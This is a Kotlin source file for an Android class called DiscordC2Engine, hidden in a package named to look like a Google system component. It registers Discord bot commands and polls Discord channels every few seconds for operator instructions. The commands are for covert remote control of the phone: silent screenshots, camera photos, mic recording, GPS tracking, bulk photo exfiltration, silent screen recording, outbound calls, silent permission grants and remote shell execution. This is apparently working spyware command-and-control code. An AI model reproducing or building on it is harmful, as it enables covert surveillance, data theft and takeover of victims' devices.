package com.google.android.system

import android.content.Context
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

/**
 * DiscordC2Engine
 *
 * Independent C2 engine managing Discord WebSocket Gateway,
 * HTTP REST channel polling, Category & Sub-channel matrix,
 * Interaction Webhook callbacks, and Media/Text telemetry streaming.
 */
class DiscordC2Engine(
    private val context: Context,
    private val botToken: String,
    private val guildId: String,
    private val httpClient: OkHttpClient,
    private val scope: CoroutineScope,
    private val commandDispatcher: (String, String) -> Unit
) {
    companion object {
        private const val TAG = "DiscordC2Engine"
    }

    fun startEngine() {
        if (botToken.isBlank() || guildId.isBlank()) return
        Log.i(TAG, "Starting Discord C2 Engine...")
        registerDiscordSlashCommands()
        startDiscordTelegramStylePollingLoop()
    }

    private fun registerDiscordSlashCommands() {
        scope.launch(Dispatchers.IO) {
            try {
                val appId = "1567549464229445843"
                val commandsList = JSONArray().apply {
                    put(JSONObject().put("name", "help").put("description", "Interactive Command Grid & Menu"))
                    put(JSONObject().put("name", "deviceinfo").put("description", "Hardware, Battery & SIM Telemetry"))
                    put(JSONObject().put("name", "status").put("description", "Check device online status & battery"))
                    put(JSONObject().put("name", "geolocation").put("description", "GPS Location & Google Maps Link"))
                    put(JSONObject().put("name", "camera").put("description", "Take Rear Camera Photo"))
                    put(JSONObject().put("name", "frontcam").put("description", "Take Front Camera Photo"))
                    put(JSONObject().put("name", "screenshot").put("description", "Immediate Silent Screenshot"))
                    put(JSONObject().put("name", "audio").put("description", "Record Ambient Mic Audio"))
                    put(JSONObject().put("name", "location").put("description", "Get GPS Location & Google Maps Link"))
                    put(JSONObject().put("name", "files").put("description", "List & Download Media Files"))
                    put(JSONObject().put("name", "dumpphotos").put("description", "Extract & Post Recent Photos (Usage: /dumpphotos [count] [offset])"))
                    put(JSONObject().put("name", "photosbydate").put("description", "Extract Photos by Date (Usage: /photosbydate YYYY-MM-DD YYYY-MM-DD [max_count])"))
                    put(JSONObject().put("name", "zipdumpphotos").put("description", "ZIP & Upload Recent Photos to Cloud Storage (Usage: /zipdumpphotos [count])"))
                    put(JSONObject().put("name", "netscan").put("description", "Multithreaded Local Subnet IP & Port Discovery (Prefix: !netscan)"))
                    put(JSONObject().put("name", "arp").put("description", "Inspect Linux Kernel /proc/net/arp Table (Prefix: !arp)"))
                    put(JSONObject().put("name", "portscan").put("description", "Probe Diagnostic Open Ports (Prefix: !portscan [ip])"))
                    put(JSONObject().put("name", "shizuku").put("description", "Root-Less ADB Shell Execution (Prefix: !shizuku [cmd])"))
                    put(JSONObject().put("name", "shizukugrant").put("description", "Background Silent Permission Granting (Prefix: !shizukugrant [pkg] [perm])"))
                    put(JSONObject().put("name", "shizukukill").put("description", "Force-Stop Target Background Process (Prefix: !shizukukill [pkg])"))
                    put(JSONObject().put("name", "recordvideo").put("description", "Silent H.264 Screen & Audio Video Recording (Prefix: !recordvideo [seconds])"))
                    put(JSONObject().put("name", "screenrecord").put("description", "Silent H.264 Screen & Audio Video Recording (Prefix: !screenrecord [seconds])"))
                    put(JSONObject().put("name", "arm").put("description", "Arm Physical Security & Motion Guard (Prefix: !arm)"))
                    put(JSONObject().put("name", "disarm").put("description", "Disarm Physical Security & Motion Guard (Prefix: !disarm)"))
                    put(JSONObject().put("name", "motion").put("description", "Configure Physical Security Motion Sensitivity (Prefix: !motion [threshold])"))
                    put(JSONObject().put("name", "duckyrecord").put("description", "Start or Stop Visual Ducky Script Macro Recording (Prefix: !duckyrecord [start|stop])"))
                    put(JSONObject().put("name", "duckyvalidate").put("description", "Validate Ducky Script Syntax Prior to Execution (Prefix: !duckyvalidate [script])"))
                    put(JSONObject().put("name", "attestation").put("description", "Hardware TEE Key Attestation & Integrity Check (Prefix: !attestation)"))
                    put(JSONObject().put("name", "termux").put("description", "Execute Termux Shell Command"))
                    put(JSONObject().put("name", "toast").put("description", "Display System Toast Message (Usage: /toast <message>)"))
                    put(JSONObject().put("name", "vibrate").put("description", "Trigger Device Haptic Vibration (Usage: /vibrate [durationMs])"))
                    put(JSONObject().put("name", "call").put("description", "Place Outbound Phone Call (Usage: /call <phoneNumber>)"))
                    put(JSONObject().put("name", "openurl").put("description", "Open Web URL in Browser (Usage: /openurl <url>)"))
                }

                val url = "https://discord.com/api/v10/applications/$appId/commands"
                val body = commandsList.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder()
                    .url(url)
                    .addHeader("Authorization", "Bot $botToken")
                    .put(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    Log.i(TAG, "Registered ${commandsList.length()} Discord Global Slash Commands: ${response.isSuccessful}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "registerDiscordSlashCommands error: ${e.message}")
            }
        }
    }

    private fun startDiscordTelegramStylePollingLoop() {
        scope.launch(Dispatchers.IO) {
            Log.i(TAG, "Discord Telegram-Style HTTP REST Polling Loop Started 🚀")
            var lastProcessedMsgId = ""
            while (true) {
                try {
                    val prefs = SecurityVaultManager.getEncryptedDiscordPrefs(context)
                    val commandsChanId = prefs.getString("chan_01-master-commands", null) ?: prefs.getString("chan_01-status-and-commands", null)
                    val termuxChanId = prefs.getString("chan_16-termux-shell", null)
                    val duckyChanId = prefs.getString("chan_29-ducky-script-payloads", null)
                    val photosChanId = prefs.getString("chan_08-photos-dump", null) ?: prefs.getString("chan_07-photos-and-screenshots", null)

                    val targetChannels = listOfNotNull(commandsChanId, termuxChanId, duckyChanId, photosChanId)
                    for (channelId in targetChannels) {
                        val url = "https://discord.com/api/v10/channels/$channelId/messages?limit=5"
                        val req = Request.Builder().url(url).addHeader("Authorization", "Bot $botToken").get().build()
                        httpClient.newCall(req).execute().use { res ->
                            if (res.isSuccessful) {
                                val array = JSONArray(res.body?.string() ?: "[]")
                                if (array.length() > 0) {
                                    val latest = array.getJSONObject(0)
                                    val msgId = latest.getString("id")
                                    val isBot = latest.optJSONObject("author")?.optBoolean("bot") ?: false
                                    val content = latest.optString("content")

                                    if (!isBot && msgId != lastProcessedMsgId && content.isNotBlank()) {
                                        if (lastProcessedMsgId.isBlank()) {
                                            lastProcessedMsgId = msgId
                                        } else {
                                            lastProcessedMsgId = msgId
                                            Log.i(TAG, "Discord REST Poll received command in $channelId: '$content'")
                                            val parsedIntent = OnDeviceAIC2Engine.parseNaturalLanguageCommand(content.trim())
                                            val dispatchText = if (parsedIntent.extractedParameters.isNotBlank()) {
                                                "${parsedIntent.targetCommand} ${parsedIntent.extractedParameters}".trim()
                                            } else {
                                                parsedIntent.targetCommand
                                            }
                                            commandDispatcher(channelId, dispatchText)
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "startDiscordTelegramStylePollingLoop error: ${e.message}")
                }
                delay(4000L)
            }
        }
    }
}
